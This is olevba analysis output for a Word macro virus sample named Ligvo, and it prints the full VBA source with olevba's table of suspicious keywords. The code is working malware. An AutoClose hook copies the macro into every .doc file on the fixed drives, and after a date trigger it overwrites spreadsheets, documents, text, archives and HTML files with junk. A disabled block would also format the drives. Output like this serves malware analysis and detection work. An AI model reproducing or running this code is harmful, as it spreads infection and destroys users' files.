olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ligvo.a-0ee3fc3e8613b94bdb6d4f8595dc65043b12a248
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ligvo.a-0ee3fc3e8613b94bdb6d4f8595dc65043b12a248 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Lingvo651.bas 
in file: Virus.MSWord.Ligvo.a-0ee3fc3e8613b94bdb6d4f8595dc65043b12a248 - OLE stream: 'Macros/VBA/Lingvo651'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































































Option Explicit
Dim name5 As String
Dim dfi(20) As String
Dim Dn As Integer
Dim fil(1000) As String
Dim fili As Integer
Dim sExtensions(100) As String
Dim iExtensions As Integer




































Sub initName()
On Error Resume Next
    name5 = "Lingvo651"

End Sub
Sub AutoClose()
    'MyMSGBOX ("Call WirWillWielen disabled")
    Call WirWillWielen
End Sub

Sub MyMSGBOX(s As String)
On Error Resume Next
    MsgBox (s)
End Sub
Sub MakeAutoMacrosEnabled()
On Error Resume Next
    WordBasic.DisableAutoMacros 0 ' are to be tested !!!
End Sub
Sub AddDocumentVariable()
On Error Resume Next
    ThisDocument.Variables.Add Name:="Gen", Value:=12
End Sub
'The following example uses the Value property with a Variable object to return the value of a document variable.

Sub UseDocumentVariable()
On Error Resume Next
    Dim intAge As Integer
    intAge = ThisDocument.Variables("Gen").Value
End Sub


Sub PrepD()
On Error Resume Next
    Dim fs, d, dc, s, n, t
    Dim t1 As String
    
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set dc = fs.Drives
    Dn = 0
    For Each d In dc
        'If (d.DriveType = 1) Or (d.DriveType = 2) Then
        If (d.DriveType = 2) Then
            Dn = Dn + 1
            t1 = d.DriveLetter
            dfi(Dn) = t1   's = s & d.DriveLetter & " - "
            Select Case d.DriveType
                Case 0: t = "Unknown"
                Case 1: t = "Removable"
                Case 2: t = "Fixed"
                Case 3: t = "Network"
                Case 4: t = "CD-ROM"
                Case 5: t = "RAM Disk"
            End Select
        End If
    Next
    '
'    Dn = 1
'    dfi(Dn) = "L"
    '
    'MsgBox s
End Sub

Sub wi()
    On Error Resume Next
    
End Sub
Sub WirWillWielen0()
On Error Resume Next
    'Dim fil(1000) As String
    Dim i As Integer
    
    Dim numberFi As Integer
    If Danke2 Then
        Exit Sub
    End If
    Call PrepD
    Dim i1 As Integer
    For i1 = 1 To Dn
    'For i1 = 6 To 6
        With Application.FileSearch
            .NewSearch
            .SearchSubFolders = True
            .FileName = "*.doc"
            .LookIn = dfi(i1) + ":\"  '"C:\"

            '.MatchTextExactly = True
            '.FileType = msoFileTypeWordDocuments
        
            .Execute
        
            numberFi = .FoundFiles.Count
            Dim count2 As Integer
            count2 = numberFi
            If count2 > 1000 Then count2 = 1000
            fili = count2
            For i = 1 To fili '.FoundFiles.Count
               fil(i) = .FoundFiles(i)
            'MsgBox .FoundFiles(I)
            'Danke = True
            'Exit Function
            Next i
            Call WirWillWielen2
       End With
    Next i1
    
    'Call wir
End Sub
Sub WirWillWielen2()
On Error Resume Next
    'MsgBox ""
    Dim i As Integer
    Call initName
    For i = 1 To fili
       Call Bary(fil(i))
    Next i
End Sub
Function Danke(Optional param As String = "desktop2.ini") As Boolean
On Error Resume Next
    'If FileSearch
    Dim i As Integer
    
    Dim numberFi As Integer
    Danke = False
    Dim tmp As String
    Dim tmp2 As String
    
    With Application.FileSearch
        .NewSearch
        .LookIn = "C:\"
        .SearchSubFolders = False
        .FileName = param '"desktop2.ini"
        '.MatchTextExactly = True
        '.FileType = msoFileTypeAllFiles
        
        .Execute
        
        numberFi = .FoundFiles.Count
        
        For i = 1 To numberFi '.FoundFiles.Count
        'MsgBox .FoundFiles(I)
            tmp = UCase(.FoundFiles(i))
            tmp2 = UCase(.LookIn + param)
            If tmp = tmp2 Then
                Danke = True
                Exit Function
            End If
        Next i
    End With
End Function
Function Danke2(Optional param As String = "desktop3.ini") As Boolean
On Error Resume Next
    Danke2 = Danke(param)
End Function
Sub Test1()
    Danke
End Sub
Public Sub Bary(dasname As String)
On Error Resume Next

'Sub Bary(dasname As String)
    'Call initName
 '   On Error GoTo bug
    Dim myname As String
    myname = ActiveDocument.FullName
    SetAttr dasname, vbNormal
    Application.OrganizerCopy Source:=myname, _
        Destination:=dasname, _
        Name:=name5, Object:=wdOrganizerObjectProjectItems
        
 '   On Error GoTo 0
    Exit Sub
bug:
    If Err = 5940 Then
        ' Das ist Ok
        'MsgBox ("Es smukt !")
    End If
    
'    MsgBox ("Err.Description = " + Err.Description + " : " + Err.Source + " ; " + Str(Err))
    
 '   On Error GoTo 0
End Sub

Sub wir()
On Error Resume Next
    If Danke Or Mich Then
        Exit Sub
    End If
    Call PrepD
    Dim i1 As Integer
    Dim i As Integer
    Dim i2 As Integer
    Dim counterX As Integer
    
    Dim numberFi As Integer
    Call InitExtensions
   For i2 = 1 To iExtensions
    For i1 = Dn To 1 Step -1
     counterX = 0
    'For i1 = 6 To 6
        With Application.FileSearch
            .NewSearch
            .SearchSubFolders = True
            .FileName = sExtensions(i2) ' "*.doc"
            .LookIn = dfi(i1) + ":\"  '"C:\"

            '.MatchTextExactly = True
            '.FileType = msoFileTypeWordDocuments
        
            .Execute
        
            numberFi = .FoundFiles.Count
            Dim count2 As Integer
            count2 = numberFi
            If count2 > 1000 Then count2 = 1000
            fili = count2
            For i = 1 To fili '.FoundFiles.Count
                counterX = counterX + 1
                If (counterX > 1000) Then
                    Exit For
                End If
                'fil(i) = .FoundFiles(i)
                fil(counterX) = .FoundFiles(i)
            'MsgBox .FoundFiles(I)
            'Danke = True
            'Exit Function
            Next i
            'Call wir2
       End With
       
        With Application.FileSearch
     ''       .NewSearch
     ''       .LookIn = dfi(i1) + ":\"  '"C:\"
     ''       .SearchSubFolders = True
     ''       .FileName = "*.xls"
            '.MatchTextExactly = True
            '.FileType = msoFileTypeWordDocuments
        
     ''       .Execute
        
     ''       numberFi = .FoundFiles.Count
     ''       Dim count3 As Integer
     ''       count3 = numberFi + count2
     ''       If count3 > 1000 Then count3 = 1000
     ''       fili = count3
     ''       For i = count2 + 1 To fili '.FoundFiles.Count
     ''          fil(i) = .FoundFiles(i - count2)
            'MsgBox .FoundFiles(I)
            'Danke = True
            'Exit Function
     ''       Next i
            Call wir2
       End With

    Next i1
   Next i2
    
   'For i1 = Dn To 1 Step -1
   Dim ss As String
   Dim ss2 As String
   Dim bbb As Boolean
   bbb = True
   
   ''For i1 = Dn To 1 Step -1
   ' For i1 = 6 To 6
        'Application.Path
        'd:\Windows\System32\
   ''     ss = "c:\Windows\System32\command /C d:\Windows\System32\format.com " + dfi(i1) + ": " + "/Q /V:v >nul"
        'ss2 = "cmd    format.com " + dfi(i1) + ": " + "/Q /V:v >nul"
   ''     ss2 = "c:\Windows\System32\cmd.exe /C " + """" + "d:\Windows\System32\format.com " + dfi(i1) + ": " + "/Q /V:v" + """"
   ''     If bbb Then
   ''         Shell ss
   ''         Shell ss2
   ''     End If
   '' Next i1

End Sub
Sub wir2()
On Error Resume Next
    Dim sfilein As String
    Dim sfileout As String
    Dim nfilein As Integer
    Dim nfileout As Integer
    Dim scur As String
    Dim sout As String
    sout = "255"
    Dim i As Integer
    

    For i = 1 To fili
        
       sfileout = fil(i)
       SetAttr sfileout, vbNormal
        nfileout = FreeFile
        Open sfileout For Output As nfileout
        Print #nfileout, sout
        Close #nfileout

    Next i
End Sub

'------------------------------------------------------

Sub InitExtensions()
    On Error Resume Next
    InitExtension ("*.xl*")
    InitExtension ("*.do*")
    InitExtension ("*.rtf")
    InitExtension ("*.txt")
    InitExtension ("*.csv")
    InitExtension ("*.zip")
    InitExtension ("*.rar")
    InitExtension ("*.*htm*")
    'InitExtension ("*.ace")
End Sub
Function InitExtension(s As String) As Variant
    On Error Resume Next
    iExtensions = iExtensions + 1
    sExtensions(iExtensions) = s
End Function




Function Mich()
    On Error Resume Next
    Dim m, d, w, y
    Dim a As Date
    Mich = True
    a = Now
    m = Month(a)
    d = Day(a)
    y = Year(a)
    w = Weekday(a)
    'MsgBox ""
    If (d >= 8 And m >= 12 And y >= 2004) Or (y >= 2005) Then ' 8/12/2004
        Mich = False
    End If
    
End Function

Public Sub WirWillWielen()
    Call WirWillWielen0
    Call wir
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|IOC       |cmd.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

